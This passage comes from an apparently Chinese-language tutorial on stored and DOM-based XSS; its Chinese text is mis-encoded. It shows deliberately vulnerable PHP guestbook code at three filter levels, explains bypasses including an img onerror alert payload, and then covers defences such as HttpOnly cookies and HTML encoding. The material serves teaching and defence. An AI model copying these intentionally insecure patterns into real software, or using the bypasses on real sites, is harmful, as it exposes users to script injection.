<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">name</span>=<span class="string">&quot;guestform&quot;</span> <span class="attr">action</span>=<span class="string">&quot;low.php&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">table</span> <span class="attr">width</span>=<span class="string">&quot;550&quot;</span> <span class="attr">border</span>=<span class="string">&quot;0&quot;</span> <span class="attr">cellpadding</span>=<span class="string">&quot;2&quot;</span> <span class="attr">cellspacing</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">td</span> <span class="attr">width</span>=<span class="string">&quot;100&quot;</span>&gt;</span>Name *<span class="tag">&lt;/<span class="name">td</span>&gt;</span> <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;txtName&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">size</span>=<span class="string">&quot;30&quot;</span> <span class="attr">maxlength</span>=<span class="string">&quot;10&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">td</span> <span class="attr">width</span>=<span class="string">&quot;100&quot;</span>&gt;</span>Message *<span class="tag">&lt;/<span class="name">td</span>&gt;</span> <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">textarea</span> <span class="attr">name</span>=<span class="string">&quot;mtxMessage&quot;</span> <span class="attr">cols</span>=<span class="string">&quot;50&quot;</span> <span class="attr">rows</span>=<span class="string">&quot;3&quot;</span> <span class="attr">maxlength</span>=<span class="string">&quot;50&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">td</span> <span class="attr">width</span>=<span class="string">&quot;100&quot;</span>&gt;</span><span class="symbol">&amp;nbsp;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;btnSign&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Sign Guestbook&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>æœåŠ¡å™¨ç«¯ä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(E_ALL);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;btnSign&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">   $servername = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line">   $username = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">   $password = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">   $dbname = <span class="string">&quot;security&quot;</span>;</span><br><span class="line"> </span><br><span class="line">   <span class="comment">// åˆ›å»ºè¿æ¥</span></span><br><span class="line">   $conn = <span class="keyword">new</span> mysqli($servername, $username, $password, $dbname);</span><br><span class="line">   <span class="comment">// æ£€æµ‹è¿æ¥</span></span><br><span class="line">   <span class="keyword">if</span> ($conn-&gt;connect_error) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&quot;æ•°æ®åº“è¿æ¥å¤±è´¥: &quot;</span> . $conn-&gt;connect_error);</span><br><span class="line">   &#125; <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;æ•°æ®åº“è¿æ¥æˆåŠŸ&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">echo</span> $_POST[<span class="string">&#x27;mtxMessage&#x27;</span>];</span><br><span class="line"></span><br><span class="line">   $message = trim( $_POST[ <span class="string">&#x27;mtxMessage&#x27;</span> ] ); </span><br><span class="line">   $name    = trim( $_POST[ <span class="string">&#x27;txtName&#x27;</span> ] ); </span><br><span class="line"></span><br><span class="line">   $message = stripslashes( $message ); </span><br><span class="line">   $message = mysqli_real_escape_string( $message ); </span><br><span class="line"></span><br><span class="line">   $name = mysqli_real_escape_string( $name ); </span><br><span class="line">  </span><br><span class="line">   $sql = <span class="string">&quot;INSERT INTO guestbook (comment,name) VALUES (&#x27;<span class="subst">$message</span>&#x27;,&#x27;<span class="subst">$name</span>&#x27;);&quot;</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;SQLæ’å…¥è¯­å¥ï¼š&quot;</span>.$sql;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">if</span> ($conn-&gt;query($sql) === <span class="literal">TRUE</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;æ–°è®°å½•æ’å…¥æˆåŠŸ&quot;</span>;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Error: &quot;</span> . $sql . <span class="string">&quot;&lt;br&gt;&quot;</span> . $conn-&gt;error;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   $conn-&gt;close();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>ç›¸å…³å‡½æ•°ä»‹ç»ï¼š</p>
<p><code>trim(string,charlist)</code>å‡½æ•°ç§»é™¤å­—ç¬¦ä¸²ä¸¤ä¾§çš„ç©ºç™½å­—ç¬¦æˆ–å…¶ä»–é¢„å®šä¹‰å­—ç¬¦ï¼Œé¢„å®šä¹‰å­—ç¬¦åŒ…æ‹¬ã€\tã€\nã€\x0Bã€\rä»¥åŠç©ºæ ¼ï¼Œå¯é€‰å‚æ•°charlistæ”¯æŒæ·»åŠ é¢å¤–éœ€è¦åˆ é™¤çš„å­—ç¬¦ã€‚</p>
<p><code>mysqli_real_escape_string(string,connection)</code>å‡½æ•°ä¼šå¯¹å­—ç¬¦ä¸²ä¸­çš„ç‰¹æ®Šç¬¦å·ï¼ˆ\x00ï¼Œ\nï¼Œ\rï¼Œ\ï¼Œâ€˜ï¼Œâ€œï¼Œ\x1aï¼‰è¿›è¡Œè½¬ä¹‰ã€‚</p>
<p><code>stripslashes(string)</code>å‡½æ•°åˆ é™¤å­—ç¬¦ä¸²ä¸­çš„åæ–œæ ã€‚</p>
<p>å¯ä»¥çœ‹åˆ°ï¼Œå¯¹è¾“å…¥å¹¶æ²¡æœ‰åšXSSæ–¹é¢çš„è¿‡æ»¤ä¸æ£€æŸ¥ï¼Œä¸”å­˜å‚¨åœ¨æ•°æ®åº“ä¸­ï¼Œå› æ­¤è¿™é‡Œå­˜åœ¨æ˜æ˜¾çš„å­˜å‚¨å‹XSSæ¼æ´ã€‚</p>
<p>å¯¹<code>Message</code>å­—æ®µæ³¨å…¥XSSä»£ç ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191108094643.png" alt=""></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191108094728.png" alt=""></p>
<p>ç”±äºNameå­—æ®µåœ¨å‰ç«¯æœ‰å­—æ•°é™åˆ¶ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨Burp SuiteæŠ“åŒ…ä¿®æ”¹å‚æ•°ã€‚</p>
</li>
<li>
<p>Medium Level</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(E_ALL);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;btnSign&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">   $servername = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line">   $username = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">   $password = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">   $dbname = <span class="string">&quot;security&quot;</span>;</span><br><span class="line"> </span><br><span class="line">   <span class="comment">// åˆ›å»ºè¿æ¥</span></span><br><span class="line">   $conn = <span class="keyword">new</span> mysqli($servername, $username, $password, $dbname);</span><br><span class="line">   <span class="comment">// æ£€æµ‹è¿æ¥</span></span><br><span class="line">   <span class="keyword">if</span> ($conn-&gt;connect_error) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&quot;è¿æ¥å¤±è´¥: &quot;</span> . $conn-&gt;connect_error);</span><br><span class="line">   &#125; <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;æ•°æ®åº“è¿æ¥æˆåŠŸ&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">echo</span> $_POST[<span class="string">&#x27;mtxMessage&#x27;</span>];</span><br><span class="line"></span><br><span class="line">   $message = trim( $_POST[ <span class="string">&#x27;mtxMessage&#x27;</span> ] ); </span><br><span class="line">   $name    = trim( $_POST[ <span class="string">&#x27;txtName&#x27;</span> ] ); </span><br><span class="line"></span><br><span class="line">   $message = strip_tags( addslashes( $message ) ); </span><br><span class="line">   $message = mysqli_real_escape_string( $message ); </span><br><span class="line">   $message = htmlspecialchars( $message ); </span><br><span class="line"></span><br><span class="line">   $name = str_replace( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $name ); </span><br><span class="line">   $name = mysqli_real_escape_string( $name );  </span><br><span class="line">  </span><br><span class="line">   $sql = <span class="string">&quot;INSERT INTO guestbook (comment,name) VALUES (&#x27;<span class="subst">$message</span>&#x27;,&#x27;<span class="subst">$name</span>&#x27;);&quot;</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;SQLæ’å…¥è¯­å¥ï¼š&quot;</span>.$sql;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//$result = mysqli_query($query) or die(&#x27;&lt;pre&gt;&#x27; . mysql_error() . &#x27;&lt;/pre&gt;&#x27; );</span></span><br><span class="line">   </span><br><span class="line">   <span class="keyword">if</span> ($conn-&gt;query($sql) === <span class="literal">TRUE</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;æ–°è®°å½•æ’å…¥æˆåŠŸ&quot;</span>;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Error: &quot;</span> . $sql . <span class="string">&quot;&lt;br&gt;&quot;</span> . $conn-&gt;error;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   $conn-&gt;close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>ç›¸å…³å‡½æ•°ä»‹ç»ï¼š</p>
<p><code>htmlspecialchars</code>ï¼šå°†ç‰¹æ®Šå­—ç¬¦è½¬æ¢ä¸º HTML å®ä½“</p>
<table>
<thead>
<tr>
<th style="text-align:left">å­—ç¬¦</th>
<th style="text-align:left">æ›¿æ¢å</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><em>&amp;</em></td>
<td style="text-align:left">&amp;amp;</td>
</tr>
<tr>
<td style="text-align:left"><em>&quot;</em></td>
<td style="text-align:left">&amp;quot;ï¼Œé™¤éè®¾ç½®äº† <strong><code>ENT_NOQUOTES</code></strong></td>
</tr>
<tr>
<td style="text-align:left"><em>â€™</em></td>
<td style="text-align:left">è®¾ç½®äº† <strong><code>ENT_QUOTES</code></strong> åï¼Œ &amp;#039;(å¦‚æœæ˜¯ <strong><code>ENT_HTML401</code></strong>) ï¼Œæˆ–è€… &amp;apos;(å¦‚æœæ˜¯ <strong><code>ENT_XML1</code></strong>ã€ <strong><code>ENT_XHTML</code></strong> æˆ– <strong><code>ENT_HTML5</code></strong>)ã€‚</td>
</tr>
<tr>
<td style="text-align:left"><em>&lt;</em></td>
<td style="text-align:left">&amp;lt;</td>
</tr>
<tr>
<td style="text-align:left"><em>&gt;</em></td>
<td style="text-align:left">&amp;gt;</td>
</tr>
</tbody>
</table>
<p>å¯ä»¥çœ‹åˆ°ï¼Œç”±äºå¯¹messageå‚æ•°ä½¿ç”¨äº†htmlspecialcharså‡½æ•°è¿›è¡Œç¼–ç ï¼Œå› æ­¤æ— æ³•å†é€šè¿‡messageå‚æ•°æ³¨å…¥XSSä»£ç ï¼Œä½†æ˜¯å¯¹äºnameå‚æ•°ï¼Œåªæ˜¯ç®€å•è¿‡æ»¤äº†<code>&lt;script&gt;</code>å­—ç¬¦ä¸²ï¼Œä»ç„¶å­˜åœ¨å­˜å‚¨å‹çš„XSSã€‚è·Ÿåå°„å‹XSSä¸€æ ·ï¼Œå¯ä»¥æŠ“åŒ…ä¿®æ”¹å‚æ•°ä½¿ç”¨<strong>åŒå†™ç»•è¿‡</strong>æˆ–<strong>å¤§å°å†™æ··æ·†ç»•è¿‡</strong>ã€‚</p>
</li>
<li>
<p>High Level</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(E_ALL);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;btnSign&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">   $servername = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line">   $username = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">   $password = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">   $dbname = <span class="string">&quot;security&quot;</span>;</span><br><span class="line"> </span><br><span class="line">   <span class="comment">// åˆ›å»ºè¿æ¥</span></span><br><span class="line">   $conn = <span class="keyword">new</span> mysqli($servername, $username, $password, $dbname);</span><br><span class="line">   <span class="comment">// æ£€æµ‹è¿æ¥</span></span><br><span class="line">   <span class="keyword">if</span> ($conn-&gt;connect_error) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&quot;è¿æ¥å¤±è´¥: &quot;</span> . $conn-&gt;connect_error);</span><br><span class="line">   &#125; <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;æ•°æ®åº“è¿æ¥æˆåŠŸ&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">echo</span> $_POST[<span class="string">&#x27;mtxMessage&#x27;</span>];</span><br><span class="line"></span><br><span class="line">   $message = trim( $_POST[ <span class="string">&#x27;mtxMessage&#x27;</span> ] ); </span><br><span class="line">   $name    = trim( $_POST[ <span class="string">&#x27;txtName&#x27;</span> ] ); </span><br><span class="line"></span><br><span class="line">   $message = strip_tags( addslashes( $message ) ); </span><br><span class="line">   $message = mysqli_real_escape_string( $message ); </span><br><span class="line">   $message = htmlspecialchars( $message ); </span><br><span class="line"></span><br><span class="line">   $name = preg_replace( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $name ); </span><br><span class="line">   $name = mysqli_real_escape_string( $name );  </span><br><span class="line">  </span><br><span class="line">   $sql = <span class="string">&quot;INSERT INTO guestbook (comment,name) VALUES (&#x27;<span class="subst">$message</span>&#x27;,&#x27;<span class="subst">$name</span>&#x27;);&quot;</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;SQLæ’å…¥è¯­å¥ï¼š&quot;</span>.$sql;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">if</span> ($conn-&gt;query($sql) === <span class="literal">TRUE</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;æ–°è®°å½•æ’å…¥æˆåŠŸ&quot;</span>;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Error: &quot;</span> . $sql . <span class="string">&quot;&lt;br&gt;&quot;</span> . $conn-&gt;error;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   $conn-&gt;close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡Œä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼è¿‡æ»¤äº†<code>&lt;script&gt;</code>æ ‡ç­¾ï¼Œä½†æ˜¯å´å¿½ç•¥äº†<code>img</code>ã€<code>iframe</code>ç­‰å…¶å®ƒå±é™©çš„æ ‡ç­¾ï¼Œå› æ­¤nameå‚æ•°ä¾æ—§å­˜åœ¨å­˜å‚¨å‹XSSã€‚ åŒæ ·æŠ“åŒ…ä¿®æ”¹nameå‚æ•°ä¸º<code> &lt;img src=1 onerror=alert(\xss\)&gt; </code></p>
</li>
</ol>
<h3 id="DOMå‹XSS">DOMå‹XSS</h3>
<h4 id="åŸç†-v3">åŸç†</h4>
<p>ç”¨æˆ·è¯·æ±‚ä¸€ä¸ªç»è¿‡ä¸“é—¨è®¾è®¡çš„URLï¼Œå®ƒç”±æ”»å‡»è€…æäº¤ï¼Œè€Œä¸”å…¶ä¸­åŒ…å«XSSä»£ç ã€‚æœåŠ¡å™¨çš„å“åº”ä¸ä¼šä»¥ä»»ä½•å½¢å¼åŒ…å«æ”»å‡»è€…çš„è„šæœ¬ã€‚å½“ç”¨æˆ·çš„æµè§ˆå™¨å¤„ç†è¿™ä¸ªå“åº”æ—¶ï¼ŒDOMå¯¹è±¡å°±ä¼šå¤„ç†XSSä»£ç ï¼Œå¯¼è‡´å­˜åœ¨XSSæ¼æ´ã€‚</p>
<p>ç”±äºDOMæ˜¯åœ¨å®¢æˆ·ç«¯ä¿®æ”¹èŠ‚ç‚¹çš„ï¼Œæ‰€ä»¥åŸºäºDOMå‹çš„XSSæ¼æ´ä¸éœ€è¦äºæœåŠ¡å™¨ç«¯äº¤äº’ï¼Œå®ƒåªå‘ç”Ÿåœ¨å®¢æˆ·ç«¯å¤„ç†æ•°æ®çš„é˜¶æ®µã€‚</p>
<h4 id="ä»£ç æ¡ˆä¾‹-v3">ä»£ç æ¡ˆä¾‹</h4>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Test DOM_XSS<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">replace</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.getElementById(<span class="string">&quot;id1&quot;</span>).innerHTML = <span class="built_in">document</span>.getElementById(<span class="string">&quot;dom_input&quot;</span>).value;</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h6</span> <span class="attr">id</span>=<span class="string">&quot;id1&quot;</span>&gt;</span>è¿™é‡Œä¼šæ˜¾ç¤ºè¾“å…¥çš„å†…å®¹<span class="tag">&lt;/<span class="name">h6</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;dom_input&quot;</span> <span class="attr">value</span>=<span class="string">&quot;è¾“å…¥&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;æ›¿æ¢&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;replace()&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191108133505.png" alt=""></p>
<h2 id="0x03-XSSæ¼æ´é˜²å¾¡">0x03 XSSæ¼æ´é˜²å¾¡</h2>
<p>å› ä¸ºXSSæ¼æ´æ¶‰åŠè¾“å…¥å’Œè¾“å‡ºä¸¤ä¸ªéƒ¨åˆ†ï¼Œæ‰€ä»¥å…¶ä¿®å¤ä¹Ÿåˆ†ä¸ºä¸¤ç§ã€‚</p>
<ul>
<li>è¿‡æ»¤è¾“å…¥çš„æ•°æ®ï¼ŒåŒ…æ‹¬<code>'</code>â€™ï¼Œ<code>&quot;</code>ï¼Œ<code>&lt;</code>ï¼Œ<code>&gt;</code>ï¼Œ<code>on*</code>ç­‰éæ³•å­—ç¬¦ã€‚</li>
<li>å¯¹è¾“å…¥åˆ°é¡µé¢çš„æ•°æ®è¿›è¡Œç›¸åº”çš„ç¼–ç è½¬æ¢ï¼ŒåŒ…æ‹¬HTMLå®ä½“ç¼–ç ã€Javascriptç¼–ç ç­‰ã€‚</li>
</ul>
<h3 id="HttpOnly">HttpOnly</h3>
<p>HttpOnlyä¸»è¦é˜²å¾¡çš„æ˜¯XSSæ¼æ´ä¸­çš„CookieåŠ«æŒï¼Œæµè§ˆå™¨ç¦æ­¢é¡µé¢çš„JavaScriptè®¿é—®å¸¦æœ‰HttpOnlyå±æ€§çš„Cookieã€‚ä¾‹å¦‚ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;? php</span><br><span class="line">setcookie(&quot;cookie1&quot;, &quot;test1&quot;, NULL, NULL, NULL, NULL, FALSE);</span><br><span class="line">setcookie(&quot;cookie2&quot;, &quot;test2&quot;, NULL, NULL, NULL, NULL, TRUE);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">	alert(document.cookie);</span><br><span class="line">	&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>è¿™æ®µä»£ç ä¸­ï¼Œcookie1æ²¡æœ‰HttpOnlyï¼Œcookie2è¢«æ ‡è®°ä¸ºHttpOnlyã€‚</p>
<h3 id="è¾“å…¥æ£€æŸ¥ï¼ˆXSS-Filterï¼‰">è¾“å…¥æ£€æŸ¥ï¼ˆXSS Filterï¼‰</h3>
<p>åœ¨XSSçš„é˜²å¾¡ä¸Šï¼Œè¾“å…¥æ£€æŸ¥ä¸€èˆ¬æ˜¯æ£€æŸ¥ç”¨æˆ·è¾“å…¥çš„æ•°æ®ä¸­æ˜¯å¦åŒ…å«ä¸€äº›ç‰¹æ®Šå­—ç¬¦ï¼Œå¦‚&lt;ã€&gt;ã€â€™ã€&quot;ç­‰ã€‚å¦‚æœå‘ç°å­˜åœ¨ç‰¹æ®Šå­—ç¬¦ï¼Œåˆ™å°†è¿™äº›å­—ç¬¦è¿‡æ»¤æˆ–è€…ç¼–ç ã€‚æ¯”è¾ƒæ™ºèƒ½çš„è¾“å…¥æ£€æŸ¥è¿˜ä¼šåŒ¹é…XSSçš„ç‰¹å¾ï¼Œæ¯”å¦‚æŸ¥æ‰¾ç”¨æˆ·æ•°æ®ä¸­æ˜¯å¦åŒ…å«äº†<code>&lt;script&gt;</code>ã€<code>javascript</code>ç­‰æ•æ„Ÿå­—ç¬¦ã€‚è€Œä¸”è¾“å…¥æ£€æŸ¥çš„é€»è¾‘å¿…é¡»æ”¾åœ¨æœåŠ¡å™¨ç«¯ä»£ç å®ç°ã€‚</p>
<p>ä½†æ˜¯XSS Filteræœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯å¯¹&quot;&lt;&quot;ã€&quot;&gt;&quot;ç­‰å­—ç¬¦çš„å¤„ç†ï¼Œå¯èƒ½ä¼šæ”¹å˜ç”¨æˆ·è¾“å…¥æ•°æ®çš„è¯­ä¹‰ã€‚å¹¶ä¸”ï¼Œè¾“å…¥çš„æ•°æ®ä¼šè¢«å±•ç¤ºåœ¨å¤šä¸ªåœ°æ–¹ï¼Œæ¯ä¸ªåœ°æ–¹çš„è¯­å¢ƒå„ä¸ç›¸åŒï¼Œä¾‹å¦‚ï¼š</p>
<p>ç”¨æˆ·è¾“å…¥çš„æ˜µç§°å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$nickname = <span class="string">&#x27;æˆ‘æ˜¯&quot;å¤©æ‰&quot;&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å¦‚æœè¢«XSS Filterè½¬ä¹‰åï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$nickname = <span class="string">&#x27;æˆ‘æ˜¯\&quot;å¤©æ‰\&quot;&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å¦‚æœåœ¨HTMLä»£ç ä¸­å±•ç¤ºï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>æˆ‘æ˜¯\&quot;å¤©æ‰\&quot;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å¦‚æœåœ¨JavaScriptä»£ç å±•ç¤ºï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> nick = <span class="string">&#x27;æˆ‘æ˜¯\&quot;å¤©æ‰\&quot;&#x27;</span>;</span><br><span class="line"><span class="built_in">document</span>.write(nick);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="è¾“å‡ºæ£€æŸ¥">è¾“å‡ºæ£€æŸ¥</h3>
<p>ä¸€èˆ¬æ¥è¯´ï¼Œé™¤äº†å¯Œæ–‡æœ¬çš„è¾“å‡ºï¼Œåœ¨å˜é‡è¾“å…¥åˆ°HTMLé¡µé¢æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ç¼–ç æˆ–è½¬ä¹‰çš„æ–¹å¼æ¥é˜²å¾¡XSSæ”»å‡»ã€‚</p>
<h3 id="HTMLEncode">HTMLEncode</h3>
<p>é’ˆå¯¹HTMLä»£ç çš„ç¼–ç æ–¹å¼æ˜¯HtmlEncodeï¼Œåœ¨HtmlEncodeä¸­è¦æ±‚è‡³å°‘è½¬æ¢ï¼š<code>&amp;</code>ã€<code>&lt;</code>ã€<code>&gt;</code>ã€<code>&quot;</code>ã€<code>'</code>ã€<code>\</code>ã€‚</p>
